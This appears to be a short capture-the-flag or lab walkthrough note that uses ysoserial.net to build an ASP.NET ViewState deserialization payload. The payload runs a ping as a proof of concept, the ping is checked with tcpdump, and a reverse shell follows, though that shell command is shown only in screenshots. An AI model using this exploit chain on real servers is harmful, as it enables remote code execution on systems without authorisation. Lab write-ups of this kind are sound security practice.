https://github.com/pwntester/ysoserial.net/releases/tag/v1.36 

![](<attachments/Pasted image 20260110000628.png>)
```powershell
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --pa...18E605E7B7872EEACE791AAD71A267BC16633468" -c "ping 10.10.14.225"
```

![](<attachments/Pasted image 20260110001324.png>)
inside `ViewState` you paste what `ysoserial.exe` generated
![](<attachments/Pasted image 20260110001412.png>)

```bash
sudo tcpdump -i tun0 
```

...
sudo tcpdump -i tun0 
```

now that we verified we have RCE, we can launch our shell

![](<attachments/Pasted image 20260110002031.png>)

we prepare the command

![](<attachments/Pasted image 20260110002104.png>)
![](<attachments/Pasted image 20260110002213.png>)
we run it
![](<attachments/Pasted image 20260110002237.png>)
